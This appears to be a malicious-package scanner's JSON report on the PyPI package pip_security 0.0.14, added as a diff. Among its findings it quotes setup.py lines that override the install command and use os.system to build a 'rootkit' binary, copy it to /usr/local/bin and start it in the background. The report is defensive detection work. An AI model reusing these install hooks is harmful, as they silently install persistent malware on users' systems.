@@ -1,0 +1,45 @@
+{
+    "issues": 5,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:31",
+                "code": "setup(\n    name='pip_security',\n    version='0.0.14',\n    description='test run background code',\n    long_description=':)',\n    author='Alberto Galera Jimenez',\n    author_email='galerajimenez@gmail.com',\n    url='https://github.com/kianxi...\n    },\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:14",
+                "code": "    os.system('cd rootkit; pyinstaller --onefile pip_security.py; cd ..')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:23",
+                "code": "        os.system('cp rootkit/dist/pip_security /usr/local/bin/rootkit')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:25",
+                "code": "        os.system('rootkit/dist/pip_security install')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:27",
+                "code": "        os.system('rootkit &')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/pip_security-0.0.14"
+}
